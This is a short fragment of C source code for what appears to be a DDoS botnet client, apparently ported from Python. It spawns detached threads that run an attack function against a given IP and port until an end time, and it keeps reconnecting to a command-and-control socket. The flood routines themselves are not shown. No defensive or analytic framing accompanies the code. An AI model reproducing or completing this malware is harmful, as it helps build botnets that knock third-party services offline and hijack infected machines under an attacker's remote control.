                for (int i = 0; i < threads; ++i) {
                    struct AttackArgs* args_struct = malloc(sizeof(struct AttackArgs));
                    if (args_struct == NULL) {
                        // perror("malloc for thread args"); // Python except
                        continue; // Try launching next thread
                    }
                    args_struct->attack_func = attack_func;
                    strncpy(args_struct->ip, ip_str, sizeof(args_struct->ip) - 1);
                    args_struct->ip[sizeof(args_struct->ip) - 1] = '\0'; // Ensure null termination
                    args_struct->port = port;
                    args_struct->end_time_ms = end_time_ms;

                    pthread_t thread_id;
                    if (pthread_create(&thread_id, NULL, attack_thread_func, args_struct) != 0) {
                        // perror("pthread_create"); // Python except
                        free(args_struct); // Free args if thread creation fails
                        continue; // Try launching next thread
                    }
                    pthread_detach(thread_id); // Replicate daemon=True
                }
            }
        }

        // If command loop breaks (disconnect or error)
        close(c2_socket);
        // The outer while(1) loop will continue, attempting to reconnect
    }

    // Close urandom_fd (optional, program runs forever)
    // close(urandom_fd); // This line will likely never be reached

    return 0; // This line will likely never be reached
}
